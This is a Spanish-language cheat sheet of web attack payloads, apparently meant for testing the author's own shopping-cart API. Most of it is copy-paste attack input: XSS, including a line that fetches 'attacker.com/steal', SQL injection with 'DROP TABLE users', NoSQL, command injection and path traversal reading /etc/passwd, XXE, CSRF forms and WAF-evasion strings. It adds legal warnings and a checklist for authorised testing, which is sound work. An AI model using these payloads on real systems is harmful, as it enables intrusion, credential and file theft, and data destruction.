# 💣 PAYLOADS DE SEGURIDAD - Banco de Pruebas

**Uso:** Copia y pega en Postman/curl para testear  
**Legal:** Solo en tus propios sistemas o con permiso

---

## 🔴 XSS PAYLOADS

```html
<!-- Simple -->
<script>alert('XSS')</script>

<!-- Con eventos -->
<img src=x onerror="alert('XSS')">

<!-- SVG -->
<svg onload="alert('XSS')">

<!-- Atributo -->
<div onclick="alert('XSS')">Click</div>

<!-- En URL -->
javascript:alert('XSS')

<!-- Encoded -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Data URL -->
data:text/html,<script>alert('XSS')</script>

<!-- HTML5 -->
<video src=x onerror="alert('XSS')">

<!-- Polimorfo -->
<img src=x onerror="fetch('http://attacker.com/steal')">
```

---

## 🔴 SQL INJECTION PAYLOADS

### Classic SQL Injection
```sql
' OR '1'='1
' OR '1'='1' --
admin' --
' UNION SELECT NULL,NULL,NULL --
```

### Time-based Blind
```sql
' AND SLEEP(5) --
' OR IF(1=1,SLEEP(5),0) --
```

### Stacked Queries
```sql
'; DROP TABLE users; --
'; INSERT INTO users VALUES(...); --
```

---

## 🔴 NOSQL INJECTION PAYLOADS

### MongoDB
```json
{"username": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$where": "this.password == 'anything' || 'x'=='x'"}
{"username": {"$regex": ".*"}}
```

### Ejemplos en URL
```
?username[$ne]=null&password[$ne]=null
?username[$regex]=.*&password[$regex]=.*
```

---

## 🔴 COMMAND INJECTION

```bash
; cat /etc/passwd
| whoami
& dir C:\
` id `
$(whoami)
```

---

## 🔴 BROKEN AUTHENTICATION

### Ataque de Fuerza Bruta (Top 100 passwords)
```
password
123456
12345678
admin
letmein
welcome
monkey
1234567
dragon
master
```

### Token Prediction
```
Token predecible: admin_1, admin_2, admin_3
JWT sin firma
JWT con algoritmo "none"
```

---

## 🔴 CSRF PAYLOADS

### HTML Form (desde malicioso.com)
```html
<form action="https://tutienda.com/api/carrito/checkout" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="submit" value="Reclama tu premio">
</form>
<script>document.forms[0].submit();</script>
```

### JSON POST (con fetch)
```javascript
fetch('https://tutienda.com/api/admin/delete-user', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({userId: 1})
})
```

---

## 🔴 IDOR (Insecure Direct Object Reference)

```
/api/user/1 → /api/user/2
/api/carrito/ABC123 → /api/carrito/XYZ789
/perfil?id=1 → /perfil?id=1000
/descargar?invoice=123 → /descargar?invoice=999
```

---

## 🔴 PATH TRAVERSAL

```
/archivo.pdf
/../../../etc/passwd
/..%2F..%2Fetc%2Fpasswd
/....//....//etc/passwd
/etc/passwd%00.jpg
```

---

## 🔴 VALIDATION BYPASS

### Type Confusion
```json
{"age": "admin"}
{"id": {"value": 1}}
{"price": "0 OR 1"}
```

### Length Bypass
```json
{"name": "a".repeat(100000)}
{"description": "x"}  // esperaba mínimo 10 chars
```

### Range Bypass
```json
{"quantity": -1000}
{"discount": 9999}
{"rating": 999}
```

---

## 🔴 XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

---

## 🔴 HEADERS MALICIOSOS

```bash
# Header Injection
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Host: malicioso.com

# User-Agent injection
User-Agent: '; DROP TABLE users; --

# Referrer spam
Referer: javascript:alert('XSS')
```

---

## 🔴 SENSITIVE DATA IN REQUESTS

```bash
# Token en URL (exposición en logs)
GET /api/datos?token=eyJhbGc...

# Datos en GET (historial del navegador)
GET /descargar?email=usuario@email.com

# Credential en URL
GET https://usuario:password@api.com/datos
```

---

## 🟡 DETECTION BYPASS

### Evitar detectores de XSS
```html
<!-- Mixto case -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Comentarios -->
<script>/**/alert/**/('XSS')</script>

<!-- Codificación -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074('XSS')">

<!-- Espacios -->
<script type="text/javascript">
  a l e r t ( ' X S S ' )
</script>
```

### Evasión de WAF
```
' /*!50000OR*/ '1'='1
UNION/**/SELECT NULL
<img/src=x/onerror=alert('XSS')>
```

---

## 📊 MATRIZ DE PAYLOADS POR VULNERABILIDAD

| Vulnerabilidad | Payload Rápido | Complejidad | Impacto |
|---|---|---|---|
| XSS | `<img src=x onerror=alert(1)>` | Baja | Media |
| SQL Injection | `' OR '1'='1` | Baja | Alta |
| NoSQL Injection | `{"$ne": null}` | Media | Alta |
| CSRF | Form oculto + submit | Media | Media |
| IDOR | Cambiar ID en URL | Baja | Alta |
| Auth Bypass | Admin/admin | Muy Baja | Alta |
| Command Injection | `; whoami` | Media | Crítica |
| XXE | XML malicioso | Media | Alta |

---

## 🛡️ CÓMO TESTEAR SEGURO

### ✅ Siempre Usa
- [ ] Ambiente LOCAL
- [ ] VPN si es remoto autorizado
- [ ] Permiso escrito del propietario
- [ ] Burp Suite o ZAP (tráfico encriptado)
- [ ] Logs para auditoría

### ❌ NUNCA Hagas
- No ataques producción sin permiso (es ilegal)
- No guardes datos robados
- No modifiques datos de otros
- No hagas ataques DDoS
- No compartas payloads en internet

---

## 📝 CHECKLIST DE TESTING

Para cada payload:

```
[ ] Payload preparado
[ ] Ambiente verificado (localhost)
[ ] Request formulada correctamente
[ ] Resultado capturado
[ ] Documentado en reporte
[ ] Status del fix actualizado
```

---

## 🔗 DONDE PROBAR ESTOS PAYLOADS

**EN TU PROYECTOCARRO:**

1. **Login:** POST /api/auth/login
   - Inyectar en `username` o `password`

2. **Productos:** GET/POST /api/products
   - Inyectar en búsqueda, nombre, descripción

3. **Carrito:** GET/POST /api/carrito
   - Inyectar en parámetros de cantidad

4. **Admin:** GET /api/admin/...
   - Verificar acceso sin autenticación

---

## 🎓 Recomendación

**NO Memorices payloads** sino:
1. Entiende la vulnerabilidad
2. Comprende por qué funciona
3. Sabe cómo detectarla
4. Aprende a implementar el fix

---

## 📚 Recursos

- [OWASP Testing Cheat Sheet](https://cheatsheetseries.owasp.org/)
- [PortSwigger Academy](https://portswigger.net/academy)
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTheBox](https://hackthebox.com)

---

**LISTA: Payloads = Herramienta de Aprendizaje, No Arma 🛡️**
